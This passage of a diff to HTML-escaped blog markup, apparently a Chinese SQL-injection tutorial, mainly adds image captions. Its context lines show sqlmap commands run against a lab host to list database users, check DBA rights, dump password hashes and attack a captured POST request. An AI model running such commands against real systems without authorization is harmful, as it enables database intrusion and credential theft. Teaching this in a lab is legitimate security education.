 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --users --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627101333092&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34; alt=&#34;image-20250627101333092&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1582,7 +1582,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-user --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627101406633&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34; alt=&#34;image-20250627101406633&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1591,7 +1591,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --is-dba --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627101434203&#34; href=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34;&gt;
 &lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34; alt=&#34;image-20250627101434203&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1604,7 +1604,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -passwords
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1615,7 +1615,7 @@
 &lt;h3 id=&#34;拦截请求&#34;&gt;拦截请求
 &lt;/h3&gt;&lt;p&gt;在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627100838668&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34; alt=&#34;image-20250627100838668&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
@@ -1624,7 +1624,7 @@
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt --dbs --batch
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
 &lt;div class=&#34;post-img-view&#34;&gt;
-&lt;a data-fancybox=&#34;gallery&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34;&gt;
+&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250627101026867&#34; href=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34;&gt;
 &lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34; alt=&#34;image-20250627101026867&#34;  /&gt;
 &lt;/a&gt;
 &lt;/div&gt;
